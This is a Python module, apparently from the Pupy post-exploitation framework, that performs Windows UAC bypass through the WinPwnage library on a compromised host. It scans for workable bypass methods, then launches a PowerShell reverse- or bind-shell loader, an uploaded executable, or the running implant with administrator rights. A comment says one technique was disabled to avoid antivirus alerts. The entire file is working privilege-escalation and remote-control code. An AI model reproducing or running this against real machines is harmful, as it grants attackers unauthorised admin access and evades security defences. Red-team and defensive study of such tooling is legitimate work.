# -*- coding: utf-8 -*-
# Bypassuac techniques use WinPwnage tool
# https://github.com/rootm0s/WinPwnage

import os

from modules.lib.windows import powerloader

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from rpyc.utils.classic import upload

import shlex
import random
import string

__class_name__ = "BypassUAC"

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):

    dependencies = ['winpwnage.core', 'winpwnage.functions.uac', 'powerloader']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="bypassuac", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-l', dest='scan', action='store_true', default=False,
            help="List all possible techniques for this host")
        cls.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
        cls.arg_parser.add_argument(
            '-r', dest='restart', action='store_true', default=False,
            help="Restart current executable as admin")
        cls.arg_parser.add_argument(
            '-m', dest='method',
            help="Should be an ID, get the list scanning which methods are possible (-l)")

    def parse_result(self, result, print_result=True, get_method_id=True):
        """
        Parse result returned by WinPwnage
        Return the best method id if possible
        """
        func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
        preferred_methods = self.client.pupsrv.config.get("bypassuac", "preferred_methods").split(',')

        method_id = []
        for tag, message in result:
            if tag in func:
                if print_result:
                    func[tag](message)
                if tag == 'ok' and get_method_id:
                    method_id.append(message.split()[0])

        if get_method_id:
            for p in preferred_methods:
                if p in method_id:
                    return p

    def launch_scan(self, print_result=True):
        """
        Check all possible methods found on the target to bypass uac
        """
        scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)
        result = scanner(uac=True, persist=False).start()
        return self.parse_result(result, print_result)

    def run(self, args):

        can_get_admin_access = self.client.remote(
            'pupwinutils.security', 'can_get_admin_access', False)

        # Check if a UAC bypass can be done
        if not can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        if args.scan:
            self.launch_scan()
            return

        if not args.scan and not args.method:
            method = self.launch_scan(print_result=False)
            if not method:
                self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
                return
        else:
            method = args.method

        # TO CHANGE:
        # A way should be found to automatically generate a dll (ex: using a generic dll which launch a bat script)
        if method in ('11', '12', '13', '14'):
            self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')
            return

        # Weird error, root cause not found yet
        if method in '07':
            self.warning('This technique does not work with custom exe, only work with cmd.exe')
            return

        # Check if it is a bind shell
        is_bind_launcher = False
        launcher_type, address_port = self.client.desc['launcher'], self.client.desc['address']

        # Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
        if launcher_type == "bind":
            self.info(
                'The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(
                    address_port))
            is_bind_launcher = True

        # ------------------ Prepare the payload ------------------

        rjoin = self.client.remote('os.path', 'join')
        risfile = self.client.remote('os.path', 'isfile')
        tempdir = self.client.remote('tempfile', 'gettempdir', False)
        random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
        local_file = ''
        remote_file = ''
        completion = None

        if not args.exe and not args.restart:
            self.info('Using powershell payload')

            client_conf = None

            if is_bind_launcher:
                self.info("BIND launcher is on the target.")
                self.info("Be careful, you have to choose a port which is not used on the target!")

                listening_port = -1
                while listening_port == -1:
                    try:
                        listening_port = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again ({})".format(e))

                listening_address = address_port.split(':')[0]
                bind_address_and_port = "{0}:{1}".format(listening_address, listening_port)
                self.info(
                    "Payload used for bypassing UAC will be "
                    "configured for listening on {0} on the target".format(
                        bind_address_and_port))

                bind_conf = self.client.get_conf()

                # Modify the listening port on the conf. If it is not modified,
                # the ps1 script will listen on the same port as the initial pupy launcher on the target
                bind_conf['launcher_args'][bind_conf['launcher_args'].index("--port")+1] = str(listening_port)
                client_conf = bind_conf
            else:
                self.info(
                    "Reverse connection mode: Configuring client with the same configuration as "
                    "the (parent) launcher on the target")
                client_conf = self.client.get_conf()

            cmd, completion = powerloader.serve(self, client_conf)

        # use a custom exe to execute as admin
        elif args.exe:
            cmd_args = shlex.split(args.exe, posix=False)
            arg0, argv = cmd_args[0], cmd_args[1:]
            argv = ' '.join(
                repr(x) if ' ' in x else x for x in argv
            )

            if risfile(arg0):
                self.info('Using remote cmd ({})'.format(args.exe))
                cmd = args.exe

            elif os.path.exists(arg0):
                self.info('Using custom executable (local)')
                local_file = args.exe
                cmd = rjoin(
                    tempdir, "{random_name}.{ext}".format(
                        random_name=random_name, ext="exe")) + ' ' + argv
            else:
                self.error('Executable file not found: {}'.format(arg0))
                return

        # restart the current executable as admin
        else:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd = self.client.desc['exec_path']

        # upload payload (ps1 or custom exe)
        if not args.restart and local_file:
            self.info("Uploading to %s" % remote_file)
            upload(self.client.conn, local_file, remote_file, chunk_size=1*1024*1024)

        # ------------------ Ready to launch the bypassuac ------------------

        self.info("Bypass uac could take few seconds, be patient...")
        bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)
        result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)
        if not result:
            self.error('Nothing done, check if the id is on the list')
        else:
            self.parse_result(result, get_method_id=False)

        if completion:
            if not completion.is_set():
                self.info('Waiting for a powerloader status updates')
                completion.wait()
        elif not args.exe and not args.restart:
            # Powershell could be longer to execute
            self.info("Waiting for a connection (take few seconds, 1 min max)...")

        # TO DO (remove ps1 file)
        # ros.remove(remote_file) # not work if removed too fast

        # Remove generated ps1 file
        if not args.exe and not args.restart and local_file:
            os.remove(local_file)
